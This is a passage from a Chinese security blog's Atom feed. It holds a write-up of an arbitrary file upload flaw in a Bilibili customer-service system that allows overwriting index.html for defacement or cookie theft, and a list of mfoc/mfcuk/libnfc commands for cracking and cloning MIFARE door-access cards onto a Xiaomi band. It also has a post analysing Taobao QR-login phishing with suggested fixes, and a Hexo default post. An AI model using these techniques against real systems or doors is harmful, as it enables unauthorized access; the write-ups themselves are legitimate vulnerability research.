    <link href="http://yoursite.com/2019/04/03/bilibili%E5%AD%90%E5%9F%9F%E5%90%8D%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%8C%82%E9%BB%91%E9%A1%B5%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/04/03/bilibili子域名根目录挂黑页问题记录/</id>
    <published>2019-04-03T07:40:30.000Z</published>
    <updated>2019-06-25T11:59:47.172Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在群里看群友在反馈一个上传接口存在任意文件上传的问题，但是B站的管理员以content-type限制并不能造成实际影响为由认为这个问题可控，事实上确实有限制，群友们一致认为除了对客服钓鱼以外也难以利用这个缺陷。于是我也一起看了看这个接口，从而有了这个记录。</p><h2 id="业务背景"><a href="#业务背景" class="headerlink" title="业务背景"></a>业务背景</h2><p>先来看看漏洞所在的业务位置：<a href="https://service.bilibili.com/chat/pc/index.html?sysNum=41076deba1104a1ba055bc38aacae3d5&amp;" title="B站某客服系统" target="_blank" rel="noopener">B站某客服系统</a><br>具体截图：<br><img src="https://image.3001.net/images/20190625/1561463258_5d1209dab0611.png" alt><br>可以看到有个上传附件的功能，问题就在这个地方出现的。这个系统主要是由第三方公司承建的，所以存在较多的问题而且B站也因为一些原因只能做整体加固不能对其进行代码修改。原来的设计就是可以上传任意后缀名的附件并提供给客服审核，所以再不济也会存在钓鱼的问题。</p><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p>没有太多好说的，就是个任意文件上传：<br><img src="https://image.3001.net/images/20190625/1561463258_5d1209dae0f46.jpg" alt><br>主要问题和一些实际情况：</p><ol><li>所有参数均可控，控制后可以改变最终路径</li><li>filename参数中会对一些特殊符号做过滤或者转义，而pid参数则相对过滤比较松</li><li>type参数是一个字典，如果为空就不会出现在路径中，目前已知的值是msg，设成msg会出现在路径中</li><li>Picture目录内可以任意写，写完后会返回路径并且可以直接访问</li><li>超过网站根目录的写直接返回400错误</li><li>对于网站根目录的写返回是成功的，但是访问的时候会显示404（指自定义文件名的时候）</li><li>上传会根据后缀名不同返回不同的content-type，基本限定在plain、img、和二进制类型，不认识的一律返回二进制contenttype</li><li>web根目录可以访问，返回content-type是html</li></ol><p>难点：</p><ol><li>content-type限制死了，在picture目录下的content-type均不能当作页面解析，也不能作为js被调用</li><li>web根目录下常规文件名均返回404，容易使人认为并没有上传成功过<br>思考：</li><li>假设上传没有权限，如超过网站根目录，返回的是400，但是这有个问题，网站根目录和picture目录之间的上传返回的是200OK，因此推断上传可能是成功的，假设上传成功，那么404应该是nginx层面做了限制</li><li>假设是nginx层面做了限制，并且web根目录访问后是一片白，看到返回的content-type是html，那么就肯定存在默认页面比如index.html。</li><li>如果前面推测没有问题，那么进而尝试覆盖index.html或者是其他可能的默认页面文件名。</li></ol><p>结论：<br>尝试覆盖index.html毫无疑问是成功的，那么至少得出可以挂黑页了，并且可以用来打全站的cookies，或者是钓鱼等等。<br>附上一张弹窗：<br><img src="https://image.3001.net/images/20190625/1561463258_5d1209dac60e9.png" alt><br>引申：</p><ol><li>考虑到系统框架用的是java系列，可能是stuts2或者是SpringMVC，我觉得是struts2，还可以在深挖一些东西通过覆盖一些系统框架文件来获取权限。因此我认为是存在getshell的可能的，或者使用框架漏洞来尝试</li><li>管理员说这个系统是网络隔离的，就算被攻陷风险也可控，但在我看来，如果真的被getshell，考虑到是个客服系统，可以通过构造一些更复杂的攻击payload去尝试攻击那些引用这个系统数据的内部系统，当然也可以用来钓鱼。</li><li>长期用以监控用户反馈，伪装客服对反馈用户进行诈骗也是可能的</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天在群里看群友在反馈一个上传接口存在任意文件上传的问题，但是B站的管理员以content-type限制并不能造成实际影响为由认为这个问题可控，事实上确实有限制，群友们一致认为除了对客服钓鱼以外也难以利用这个缺陷。于是我也一起看了看这个接口，从而有了这个记录。&lt;/p&gt;
&lt;h
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="上传漏洞" scheme="http://yoursite.com/tags/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>小米手环刷公司门禁</title>
    <link href="http://yoursite.com/2019/04/02/%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81/"/>
    <id>http://yoursite.com/2019/04/02/小米手环刷公司门禁/</id>
    <published>2019-04-02T05:32:55.000Z</published>
    <updated>2019-04-08T11:50:33.731Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考的这篇文章<a href="http://bbs.xiaomi.cn/t-34469927" title="小米手环刷门禁" target="_blank" rel="noopener">PN532全加密门禁卡模拟成功</a></p><h2 id="记一下破解密码的相关命令"><a href="#记一下破解密码的相关命令" class="headerlink" title="记一下破解密码的相关命令"></a>记一下破解密码的相关命令</h2><ul><li>mfcuk -C -R 0:A -s 250 -S 250    #该命令貌似是破解密钥但是我没成功过，它在链接我的NFC设备的时候总报错</li><li>mfoc -O test.dmp      #该命令是可以把内容整个dump出来并且可以破解key的</li><li>nfc-list    #该命令是libnfc中带着的命令，可以列出UID</li><li>nfc-mfsetuid xxxxxx     #该命令也是libnfc中用来设置UID的命令</li><li>nfc-mfclassic w a test.dmp #该命令是用来将数据整个写入到卡里，我理解上是直接复制卡内容，但是好像是有限制的，我在复制的时候也不确定有没有成功。<h3 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h3>小米手环模拟卡片后不知道为什么使用mfoc -O xxx.dmp不能dump里面的数据，但基本可以确定数据已经复制进去了。不过后来我发现虽然那些门禁卡都是加密卡，但是起作用的只是UID，所以一定程度上我们只需要复制UID就可以了。<h2 id="复制UID"><a href="#复制UID" class="headerlink" title="复制UID"></a>复制UID</h2>复制UID的流程就很简单了：</li><li>将需要复制的卡放到读卡器上使用nfc-list读书UID并记录</li><li>将空白卡放到读卡器上使用nfc-mfsetuid设置上面的UID</li><li>小米手环复制非加密卡功能来复制空白卡即可（因为小米限制了复制加密卡）<h2 id="复制加密内容"><a href="#复制加密内容" class="headerlink" title="复制加密内容"></a>复制加密内容</h2>经过测试部分门禁还是会校验加密内容，如果测试过只复制UID无效情况下，可以尝试下面的方法把加密内容一起复制进去，虽然手环在命令读取下没有数据返回但是通过测试发现应该还是有写入成功的。</li><li>mfoc -O test.dmp #来复制卡片内容同时会破解卡片</li><li>先通过复制UID的过程让小米手环模拟白卡</li><li>修改test.dmp文件中，将除了有数据的64blok保留其他都删掉</li><li>按照文章中所示修改对应行的数据</li><li>nfc-mfclassic w a test.dmp #将文件内的数据写入到卡片里<h3 id="PS：-1"><a href="#PS：-1" class="headerlink" title="PS："></a>PS：</h3>读卡器可能会因为驱动问题写入失败，多试几次确保写入成功。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;主要参考的这篇文章&lt;a href=&quot;http://bbs.xiaomi.cn/t-34469927&quot; title=&quot;小米手环刷门禁&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PN532全加密门禁卡模拟成功&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;记一下破解密码
      
    
    </summary>
    
      <category term="物联网" scheme="http://yoursite.com/categories/%E7%89%A9%E8%81%94%E7%BD%91/"/>
    
    
      <category term="极客" scheme="http://yoursite.com/tags/%E6%9E%81%E5%AE%A2/"/>
    
      <category term="物联网" scheme="http://yoursite.com/tags/%E7%89%A9%E8%81%94%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>关于淘宝二维码问题的一些想法</title>
    <link href="http://yoursite.com/2019/03/29/%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
    <id>http://yoursite.com/2019/03/29/关于淘宝二维码钓鱼问题的一些想法/</id>
    <published>2019-03-29T09:36:45.000Z</published>
    <updated>2019-03-29T10:26:25.184Z</updated>
    
    <content type="html"><![CDATA[<p>今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接<a href="http://www.sohu.com/a/304529557_354899" title="淘宝二维码钓鱼问题" target="_blank" rel="noopener">淘宝二维码钓鱼问题原文</a></p><h2 id="大致描述"><a href="#大致描述" class="headerlink" title="大致描述"></a>大致描述</h2><p>总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。<br>流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。</p><h2 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h2><p>一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个：</p><ol><li>淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。</li><li>淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。</li><li>扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。</li></ol><p>我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。<br>当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接&lt;a href=&quot;http://www.sohu.com/a/304529557_354899&quot; title=&quot;淘宝二维码钓鱼问题&quot; target=&quot;_blank&quot; rel=&quot;no
      
    
    </summary>
    
      <category term="案例记录与反思" scheme="http://yoursite.com/categories/%E6%A1%88%E4%BE%8B%E8%AE%B0%E5%BD%95%E4%B8%8E%E5%8F%8D%E6%80%9D/"/>
    
    
      <category term="钓鱼" scheme="http://yoursite.com/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2019/03/27/hello-world/"/>
    <id>http://yoursite.com/2019/03/27/hello-world/</id>
    <published>2019-03-27T02:03:48.365Z</published>
    <updated>2019-03-29T08:41:30.306Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
